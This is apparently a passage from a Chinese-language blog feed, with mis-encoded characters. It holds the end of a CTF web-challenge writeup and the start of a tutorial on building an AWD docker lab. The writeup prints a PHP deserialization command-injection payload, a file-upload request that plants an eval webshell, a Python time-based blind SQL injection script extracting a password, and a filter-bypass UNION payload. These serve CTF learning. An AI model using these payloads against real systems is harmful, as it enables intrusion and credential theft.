class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">===</span><span class="token string">"doller"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token operator">===</span><span class="token string">"give"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$bbb</span><span class="token operator">===</span><span class="token string">"me"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token operator">===</span><span class="token string">"flag"</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br>welcome!&lt;br>"</span><span class="token punctuation">;</span>                <span class="token variable">$come</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'come'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$come</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>think about it&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"NO"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Can you hack me?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>è¿™æ˜¯ä¸€ä¸ªå…³é”®ç‚¹ä¸ºååºåˆ—åŒ–çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ„é€ getå‚æ•°ç»•è¿‡å‰é¢çš„æ£€æµ‹ï¼Œæ¥åˆ°postå‚æ•°å¤„ã€‚</p><p>æ„é€ getå‚æ•°:<code>?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code>,é€šè¿‡parse_strè¦†ç›–åŸæœ‰å˜é‡å³å¯ã€‚</p><p>ç„¶åè¿™é¢˜å¹¶ä¸æ˜¯ç»•è¿‡wakeupï¼Œå› ä¸ºåœ¨æ–°ç‰ˆphpä¸­å·²ç»ä¿®å¤è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¦åœ¨echo($host)å¤„æ³¨å…¥å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦è§„è§„çŸ©çŸ©åœ°è¿›è¡Œç»•è¿‡è¿‡æ»¤ï¼Œå°†æ„é€ çš„come Postè¿‡å»ï¼š</p><p><code>come==O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3B%3A1%3A%7Bi%3A0%3Bs%3A23%3A%22aaa%26%26cat%24IFS%22%2Fflflagag%22%22%3B%7D%7D</code></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸ç”¨ç©ºæ ¼æ‰§è¡Œå‘½ä»¤ï¼ˆ <a href="https://www.cnblogs.com/sevck/p/6072721.html" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥ </a>ï¼‰ï¼Œä»¥åŠååºåˆ—åŒ–ä¸­ç§æœ‰å˜é‡çš„%00é—®é¢˜ï¼Œå¦‚æœä¸ä»¥urlç¼–ç å½¢å¼ï¼Œ%00å¹¶ä¸ä¼šèµ·ä½œç”¨ã€‚</p></blockquote><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><blockquote><p>è™½ç„¶æ²¡åšå‡ºæ¥ğŸ˜­ï¼Œä½†è¿˜æ˜¯è¦å­¦ä¹ ä¸€ä¸‹çš„ã€‚</p><p>åˆæ˜¯phpçš„ä»£ç å®¡è®¡é¢˜ã€‚</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//error_reporting(0);</span>    <span class="token comment" spellcheck="true">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span>    <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"icq"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/sandbox/'</span> <span class="token punctuation">.</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token operator">==</span><span class="token variable">$filename</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"emmmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$new_name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hehe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">'@&lt;?php'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p>è€ƒå¯Ÿä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼Œä¸€ä¸ªæ˜¯æ•°ç»„ç»•è¿‡ï¼Œä»¥åŠunlink  <del>php/.</del> ç»•è¿‡ã€‚</p><p>æ„é€ æ•°æ®åŒ…å¦‚ä¸‹ï¼ˆæœ¬åœ°å¤ç°ï¼‰ï¼š</p><pre class=" language-shell"><code class="language-shell">POST /shawsweb3.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://127.0.0.1/upload.htmlContent-Type: multipart/form-data; boundary=----------------------------280543779984883401718121Content-Length: 586Connection: closeUpgrade-Insecure-Requests: 1----------------------------280543779984883401718121Content-Disposition: form-data; name="file[0]"php----------------------------280543779984883401718121Content-Disposition: form-data; name="file[a]"php/.----------------------------280543779984883401718121Content-Disposition: form-data; name="hehe"100.php----------------------------280543779984883401718121Content-Disposition: form-data; name="file"; filename="index.php"Content-Type: application/x-httpd-php@<?php    @eval($_GET['cmd']);?>----------------------------280543779984883401718121--</code></pre><p>å†é€šè¿‡éå†æ–‡ä»¶åæ‹¿åˆ°æƒé™ï¼Œgetflagã€‚</p></blockquote><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>æ—¶é—´ç›²æ³¨ + æ–‡ä»¶åæ‹¼æ¥  + ä¸Šä¼ æˆªæ–­ç»•è¿‡ï¼Œ%02é»‘è„¸æˆªæ–­ğŸ˜„ã€‚</p><p>æ„é€ å‡ºpayloadåå¯ä»¥ç›´æ¥æ‹¿ç»™sqlmapè·‘ï¼Ÿç¥å™¨ï¼ˆæœ‰æ—¶é—´å†æ·±å…¥ç ”ç©¶ä¸€ä¸‹ï¼‰ã€‚ä¹Ÿå¯ä»¥è‡ªå·±å†™è„šæœ¬è·‘ï¼Œä¾‹å¦‚ä¸‹é¢å°±æ˜¯æˆ‘è®¤ä¸ºä¸€ä¸ªå†™çš„æ¯”è¾ƒç®€å•æ˜“ç”¨çš„è„šæœ¬ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#é‡ç”¨æ€§é«˜çš„ä»£ç æ˜¯å¥½ä»£ç </span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> text <span class="token operator">!=</span> <span class="token string">'$content=str_replace($value,"",$content)'</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://dbeffc8ba3a84abebc7ff930c5d6fda460a4bee570ff4211.game.ichunqiu.com/select_guest.php"</span>    <span class="token keyword">return</span> get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">blind_inject</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        left <span class="token operator">=</span> <span class="token number">0</span>        right <span class="token operator">=</span> <span class="token number">128</span>        <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            c <span class="token operator">=</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            payload <span class="token operator">=</span> s<span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(payload)</span>            <span class="token keyword">if</span> judge<span class="token punctuation">(</span>test<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>        r <span class="token operator">+=</span> chr<span class="token punctuation">(</span>left<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token operator">+</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#blind_inject("1%27%20and%20substr(database(),{},1)%20>%20%27{}%27%23")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),{},1) > '{}'#")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(column_name) FROM information_schema . columns WHERE table_name = 'user' and table_schema=database()), {},1) > '{}' #")</span>    <span class="token comment" spellcheck="true">#</span>    blind_inject<span class="token punctuation">(</span><span class="token string">"1' and substr((SELECT password FROM web.user where id = 1), {},1) > '{}' #"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è·‘flagå³å¯ã€‚</p><p>emmmä»¥ä¸Šæ˜¯ç›²æ³¨çš„æ–¹æ³•ï¼Œé‚£ä¹ˆä¸‹é¢è¿˜æœ‰é€šè¿‡fuzzå¾—åˆ°è¿‡æ»¤å…³é”®å­—ï¼Œç„¶åç»•è¿‡ç›´æ¥æ³¨çš„ï¼Œå› ä¸ºè¿™æ˜¯æœ‰å›æ˜¾çš„ä¸€ä¸ªæ³¨å…¥å˜›ã€‚</p><p><code>id=sd&#39; unifromon selselectect (seselectlect group_concat(username,&#39;:&#39;,password)frfromom web.user),2#</code></p><p>æ€»ä¹‹æ–¹æ³•æ€»æ˜¯å¤šç§å¤šæ ·çš„ã€‚</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><blockquote><p>è‡³äºäºŒè¿›åˆ¶ï¼Œè¿˜åœ¨å­¦ä¹ ä¹‹ä¸­ï¼Œå¯†ç å­¦çš„RSA,å’ŒAESä¹Ÿéœ€è¦æŠ½ä¸ªæ—¶é—´æ¥æ·±å…¥ç ”ç©¶ä¸€ä¸‹ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ç½‘ç»œå®‰å…¨ </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD_docker</title>
      <link href="/2018/11/03/AWD-docker/"/>
      <url>/2018/11/03/AWD-docker/</url>
      
        <content type="html"><![CDATA[<p>æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD dockerã€‚</p><a id="more"></a><h1 id="æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD-docker"><a href="#æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD-docker" class="headerlink" title="æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD docker"></a>æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD docker</h1><h2 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h2><blockquote><p>ä¹‹å‰å·²ç»è®²è¿‡dockeræ€ä¹ˆå®‰è£…ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œ<code>sudo apt-get install docker.io</code>ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚</p></blockquote><h2 id="æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image"><a href="#æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image" class="headerlink" title="æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image"></a>æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image</h2><blockquote><p>é€šè¿‡<code>sudo docker search lamp</code>ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾åˆ°æœ‰lampé›†æˆç¯å¢ƒçš„ä»–äººä¸Šä¼ çš„imageï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224056.png" alt=""></p><p>äºæ˜¯æˆ‘é€‰æ‹©äº† tutum/lampè¿™ä¸ªimageã€‚</p><p>ä½¿ç”¨å‘½ä»¤ï¼š<code>sudo docker pull tutum/lamp</code>ï¼Œå°†imageæ‹‰å–åˆ°æœ¬åœ°åï¼Œä½¿ç”¨å‘½ä»¤<code>sudo docker images</code>æŸ¥çœ‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224557.png" alt=""></p></blockquote><h2 id="å°†CTF-xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹"><a href="#å°†CTF-xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹" class="headerlink" title="å°†CTF_xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹"></a>å°†CTF_xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹</h2><blockquote><p>ä¿®æ”¹å¦‚ä¸‹:</p><ul><li><p>å°†åŸæ¥çš„<code>FORM ubuntu:16.04</code>æ”¹ä¸º<code>FROM tutum/lamp</code>å³ä¹‹å‰æ‹‰å–ä¸‹æ¥çš„å…·æœ‰webç¯å¢ƒçš„imageã€‚</p></li><li><p>æ·»åŠ <code>RUN apt-get -y install openssh-server</code>ä¸ºsshè¿æ¥åšå‡†å¤‡ã€‚</p></li><li>æ·»åŠ awdå‚èµ›è€…ç”¨æˆ·<code>RUN useradd -u 544  -g users -s /bin/bash -m awduser</code></li><li>æ·»åŠ htmlç›®å½•ä¸‹çš„webé¢˜æºç :<code>COPY ./html/ /var/www/html/web/</code></li><li>é…ç½®sshè¿œç¨‹è¿æ¥ï¼š<code>COPY ./sshd_config.txt /etc/ssh/sshd_config</code></li></ul></blockquote><pre class=" language-dockerfile"><code class="language-dockerfile">FROM tutum/lampRUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list && \    apt-get update && \    apt-get install -y lib32z1 xinetdRUN apt-get -y install openssh-serverRUN useradd -m ctfRUN useradd -u 544  -g users -s /bin/bash -m awduserWORKDIR /home/RUN cp -R /lib* /home/ctf && \    cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/dev && \    mknod /home/ctf/dev/null c 1 3 && \    mknod /home/ctf/dev/zero c 1 5 && \    mknod /home/ctf/dev/random c 1 8 && \    mknod /home/ctf/dev/urandom c 1 9 && \    chmod 666 /home/ctf/dev/*RUN mkdir /home/ctf/bin && \    cp /bin/sh /home/ctf/bin && \    cp /bin/ls /home/ctf/bin && \    cp /bin/cat /home/ctf/bin && \    cp /bin/bash /home/ctf/bin && \    cp /bin/nc /home/ctf/bin && \    cp /usr/bin/git /home/ctf/binCOPY ./ctf.xinetd /etc/xinetd.d/ctfCOPY ./start.sh /start.shRUN echo "Blocked by ctf_xinetd" > /etc/banner_failRUN chmod +x /start.shCOPY ./html/ /var/www/html/web/COPY ./bin/ /home/ctf/COPY ./sshd_config.txt /etc/ssh/sshd_configRUN chown -R root:ctf /home/ctf && \    chown -R awduser:users /var/www/html/* && \    chmod -R 777 /var/www/html/* && \    chmod -R 750 /home/ctf && \    chmod 740 /home/ctf/flagRUN service ssh startCMD ["/start.sh"]CMD ["/run.sh"]EXPOSE 9999</code></pre><p>é™„ä¸Šsshd_configé…ç½®ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#    $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $</span><span class="token comment" spellcheck="true"># This is the sshd server system-wide configuration file.  See</span><span class="token comment" spellcheck="true"># sshd_config(5) for more information.</span><span class="token comment" spellcheck="true"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><span class="token comment" spellcheck="true"># The strategy used for options in the default sshd_config shipped with</span><span class="token comment" spellcheck="true"># OpenSSH is to specify options with their default value where</span><span class="token comment" spellcheck="true"># possible, but leave them commented.  Uncommented options override the</span><span class="token comment" spellcheck="true"># default value.</span><span class="token comment" spellcheck="true">#Port 22</span><span class="token comment" spellcheck="true">#AddressFamily any</span><span class="token comment" spellcheck="true">#ListenAddress 0.0.0.0</span><span class="token comment" spellcheck="true">#ListenAddress ::</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_rsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ed25519_key</span><span class="token comment" spellcheck="true"># Ciphers and keying</span><span class="token comment" spellcheck="true">#RekeyLimit default none</span><span class="token comment" spellcheck="true"># Logging</span><span class="token comment" spellcheck="true">#SyslogFacility AUTH</span><span class="token comment" spellcheck="true">#LogLevel INFO</span><span class="token comment" spellcheck="true"># Authentication:</span><span class="token comment" spellcheck="true">#LoginGraceTime 2m</span><span class="token comment" spellcheck="true">#PermitRootLogin prohibit-password</span><span class="token comment" spellcheck="true">#StrictModes yes</span><span class="token comment" spellcheck="true">#MaxAuthTries 6</span><span class="token comment" spellcheck="true">#MaxSessions 10</span><span class="token comment" spellcheck="true">#PubkeyAuthentication yes</span><span class="token comment" spellcheck="true"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><span class="token comment" spellcheck="true">#AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</span><span class="token comment" spellcheck="true">#AuthorizedPrincipalsFile none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommand none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommandUser nobody</span><span class="token comment" spellcheck="true"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><span class="token comment" spellcheck="true">#HostbasedAuthentication no</span><span class="token comment" spellcheck="true"># Change to yes if you don't trust ~/.ssh/known_hosts for</span><span class="token comment" spellcheck="true"># HostbasedAuthentication</span><span class="token comment" spellcheck="true">#IgnoreUserKnownHosts no</span><span class="token comment" spellcheck="true"># Don't read the user's ~/.rhosts and ~/.shosts files</span><span class="token comment" spellcheck="true">#IgnoreRhosts yes</span><span class="token comment" spellcheck="true"># To disable tunneled clear text passwords, change to no here!</span><span class="token comment" spellcheck="true">#PasswordAuthentication yes</span><span class="token comment" spellcheck="true">#PermitEmptyPasswords no</span><span class="token comment" spellcheck="true"># Change to yes to enable challenge-response passwords (beware issues with</span><span class="token comment" spellcheck="true"># some PAM modules and threads)</span>ChallengeResponseAuthentication no<span class="token comment" spellcheck="true"># Kerberos options</span><span class="token comment" spellcheck="true">#KerberosAuthentication no</span><span class="token comment" spellcheck="true">#KerberosOrLocalPasswd yes</span><span class="token comment" spellcheck="true">#KerberosTicketCleanup yes</span><span class="token comment" spellcheck="true">#KerberosGetAFSToken no</span><span class="token comment" spellcheck="true"># GSSAPI options</span><span class="token comment" spellcheck="true">#GSSAPIAuthentication no</span><span class="token comment" spellcheck="true">#GSSAPICleanupCredentials yes</span><span class="token comment" spellcheck="true">#GSSAPIStrictAcceptorCheck yes</span><span class="token comment" spellcheck="true">#GSSAPIKeyExchange no</span><span class="token comment" spellcheck="true"># Set this to 'yes' to enable PAM authentication, account processing,</span><span class="token comment" spellcheck="true"># and session processing. If this is enabled, PAM authentication will</span><span class="token comment" spellcheck="true"># be allowed through the ChallengeResponseAuthentication and</span><span class="token comment" spellcheck="true"># PasswordAuthentication.  Depending on your PAM configuration,</span><span class="token comment" spellcheck="true"># PAM authentication via ChallengeResponseAuthentication may bypass</span><span class="token comment" spellcheck="true"># the setting of "PermitRootLogin without-password".</span><span class="token comment" spellcheck="true"># If you just want the PAM account and session checks to run without</span><span class="token comment" spellcheck="true"># PAM authentication, then enable this but set PasswordAuthentication</span><span class="token comment" spellcheck="true"># and ChallengeResponseAuthentication to 'no'.</span>UsePAM <span class="token function">yes</span><span class="token comment" spellcheck="true">#AllowAgentForwarding yes</span><span class="token comment" spellcheck="true">#AllowTcpForwarding yes</span><span class="token comment" spellcheck="true">#GatewayPorts no</span>X11Forwarding <span class="token function">yes</span><span class="token comment" spellcheck="true">#X11DisplayOffset 10</span><span class="token comment" spellcheck="true">#X11UseLocalhost yes</span><span class="token comment" spellcheck="true">#PermitTTY yes</span>PrintMotd no<span class="token comment" spellcheck="true">#PrintLastLog yes</span><span class="token comment" spellcheck="true">#TCPKeepAlive yes</span><span class="token comment" spellcheck="true">#UseLogin no</span><span class="token comment" spellcheck="true">#PermitUserEnvironment no</span><span class="token comment" spellcheck="true">#Compression delayed</span><span class="token comment" spellcheck="true">#ClientAliveInterval 0</span><span class="token comment" spellcheck="true">#ClientAliveCountMax 3</span><span class="token comment" spellcheck="true">#UseDNS no</span><span class="token comment" spellcheck="true">#PidFile /var/run/sshd.pid</span><span class="token comment" spellcheck="true">#MaxStartups 10:30:100</span><span class="token comment" spellcheck="true">#PermitTunnel no</span><span class="token comment" spellcheck="true">#ChrootDirectory none</span><span class="token comment" spellcheck="true">#VersionAddendum none</span><span class="token comment" spellcheck="true"># no default banner path</span><span class="token comment" spellcheck="true">#Banner none</span><span class="token comment" spellcheck="true"># Allow client to pass locale environment variables</span>AcceptEnv LANG LC_*<span class="token comment" spellcheck="true"># override default of no subsystems</span>Subsystem    <span class="token function">sftp</span>    /usr/lib/openssh/sftp-server<span class="token comment" spellcheck="true"># Example of overriding settings on a per-user basis</span><span class="token comment" spellcheck="true">#Match User anoncvs</span><span class="token comment" spellcheck="true">#    X11Forwarding no</span><span class="token comment" spellcheck="true">#    AllowTcpForwarding no</span><span class="token comment" spellcheck="true">#    PermitTTY no</span><span class="token comment" spellcheck="true">#    ForceCommand cvs server</span></code></pre><blockquote><p>æ­¤æ—¶ctf_xinetdæ–‡ä»¶å¤¹ä¸‹çš„æƒ…å†µå¤§è‡´å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103225916.png" alt=""></p><p>binæ–‡ä»¶å¤¹ç”¨äºæ”¾ç½® 